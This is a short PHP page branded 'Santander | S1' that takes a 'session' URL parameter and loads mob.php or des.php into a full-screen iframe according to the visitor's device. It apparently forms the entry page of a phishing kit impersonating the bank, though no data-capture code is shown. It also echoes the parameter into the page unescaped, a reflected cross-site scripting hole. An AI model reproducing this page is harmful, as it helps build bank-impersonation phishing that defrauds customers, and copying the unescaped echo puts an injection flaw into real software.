<?php 
    $session = $_GET['session'];
?>
<html>
<head>
    
    <title>Santander | S1 [1.3.7]</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,minium-scale=1,maximum-scale=1,user-scalable=0',shrink-to-fit=no">
    <!--<base href="/MiSitioPrivado/">-->
    <link rel="icon" type="image/x-icon" href="../favicon.ico">
    
    
    <style>

        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        iframe{
            width: 100%;
            border: none;
            height: 100vh;
        }

    </style>
    <script src="../jquery-1.7.1.min.js"></script>
    <script>
        $(document).ready(function(){

            //alert($('#session').val());

            if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
                $('iframe').attr('src','mob.php?session='+$('#session').val());
            }else{
                $('iframe').attr('src','des.php?session='+$('#session').val());
            }
        });
    </script>
</head>
<body>
<input type="hidden" name="session" id="session" value="<?=$session;?>">
<iframe src=""></iframe>
</body>
</html>